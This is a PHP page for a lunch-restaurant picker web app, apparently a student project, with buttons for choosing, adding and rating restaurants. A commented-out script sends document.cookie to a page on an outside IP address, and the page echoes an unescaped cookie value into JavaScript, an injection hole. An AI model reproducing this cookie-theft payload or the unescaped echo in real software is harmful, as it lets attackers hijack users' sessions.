<?php
session_start();
$_SESSION['count'] = 0;
if (isset($_COOKIE['uname'])==1){
	$hi = $_COOKIE['uname'];
}
?>

<html>
<head>
<title>測試</title>
<style type="text/css"> 
    div { 
	margin-right:auto; 
	margin-bottom:0px; 
	border: 1px solid 000000; 
    }
	.demo2-bg{
    background: url(802011.jpg);
    background-size: cover;
    width: 1920px;
    height: 1350px;
    position: relative;
	}
.demo2{
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    width: 1920px;
    height: 1350px;
    line-height: 50px;
    text-align: left;
    background:rgba(255,255,255,0.47);
}
.tt {      
	margin-top:15%; 
	margin-left:20%; 
	margin-right:auto; 
	margin-bottom:20px; 
	border: 1px solid 000000; 
    } 
</style> 
<script>
function listCookies() {
    var theCookies = document.cookie.split(';');
    var aString = '';
    for (var i = 1 ; i <= theCookies.length; i++) {
        aString += i + ' ' + theCookies[i-1] + "\n";
    }
    return aString;
}
alert('<?php echo $hi ?> 你好！');
</script>
<div class = "demo2-bg">
<div class = "demo2">
<div class = "tt">
	<!--<script type="text/javascript">  
		document.location='http://140.116.72.134/Lunch/bad_page.php ?c=' + document.cookie;
    </script>-->
	<form action="fucking_eat.php" method="post">
	<input type="submit" style="width:200px;height:100px;margin-bottom:30px;" name="SB1" value="要吃啥">
	</form>
	<form action="new.php" method="post">
	<input type="submit" style="width:200px;height:100px;margin-bottom:30px;" name="SB2" value="新增餐廳資料">
	</form>
	<form action="rate.php" method="post">
	<input type="submit" style="width:200px;height:100px;margin-bottom:30px;" name="SB3" value="給餐廳評價">
	</form>
	<form action="gbk.html" method="post">
	<input type="submit" style="width:200px;height:100px;margin-bottom:30px;" name="SB4" value="餐廳評價留言板">
	</form>
	<!--<script>document.location.href='http://www.fb.com';</script>-->
	<!--<A href="gbk.html">餐廳評價留言板</a>-->

</div>
</div>
</div>
</head>
<body>
</body>
</html>